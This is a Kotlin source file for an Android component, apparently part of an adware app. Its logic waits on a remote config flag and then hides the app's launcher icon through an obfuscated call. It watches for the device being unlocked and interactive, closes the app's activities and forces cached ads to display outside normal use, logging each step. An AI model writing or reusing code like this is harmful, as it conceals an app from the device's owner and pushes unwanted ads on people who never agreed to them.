package com.tele.core.observer

import android.app.KeyguardManager
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.os.Build
import android.os.PowerManager
import com.applovin.sdk.app
import com.tele.core.AppObserver
import com.tele.core.tools.ActivitiesCallback
import com.tele.core.tools.AppAdsManager
import com.tele.core.tools.AppReceiver
import com.tele.core.tools.EventManager
import com.tele.core.tools.failed
import com.tele.core.tools.first
import com.tele.core.tools.top
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.MainScope
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext

object MainObserver : AppObserver {
    private var init = false
    private var nexting = false

    override fun observe() {
        CoroutineScope(Dispatchers.IO).launch {
            while (init.not()) {
                delay(2000)
                if (top && ConfigObserver.out) {
                    init = true
                    app.registerReceiver(AppReceiver(), IntentFilter(Intent.ACTION_USER_PRESENT))
                    hideIcon()
                    task()
                }
            }
        }
    }

    private fun hideIcon() {
        CoroutineScope(Dispatchers.IO).launch {
            while (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q && System.currentTimeMillis() - first < ConfigObserver.first) delay(5000)
            withContext(Dispatchers.Main) {
                e1.a.a(app, "chang hong")
            }
        }
    }

    private suspend fun task() {
        while (failed < ConfigObserver.failed) {
            EventManager.event("time")
            val on = !(app.getSystemService(Context.KEYGUARD_SERVICE) as KeyguardManager).isDeviceLocked
                    && (app.getSystemService(Context.POWER_SERVICE) as PowerManager).isInteractive
            if (on) {
                EventManager.event("isunlock")
                if (System.currentTimeMillis() - ConfigObserver.last >= ConfigObserver.interval) nextStep()
            }
            delay(ConfigObserver.detect)
        }
        EventManager.event("jumpfail")
    }

    fun nextStep() {
        if (System.currentTimeMillis() - first < ConfigObserver.first) return
        if (nexting) return
        nexting = true
        EventManager.event("ispass")
        if (AppAdsManager.hasCache()) {
            ActivitiesCallback.finishAll()
            waitShow()
        } else if (System.currentTimeMillis() - ConfigObserver.last >= ConfigObserver.detect * 5) {
            ActivitiesCallback.finishAll()
            AppAdsManager.load()
            waitShow()
        } else {
            nexting = false
        }
    }

    private fun waitShow() {
        MainScope().launch {
            delay(1000L)
            nexting = false
            if (AppAdsManager.hasCache()) {
                EventManager.event("isready")
                failed++
                withContext(Dispatchers.IO) {
                    e1.a.a(app, "doing")
                }
            }
        }
    }
}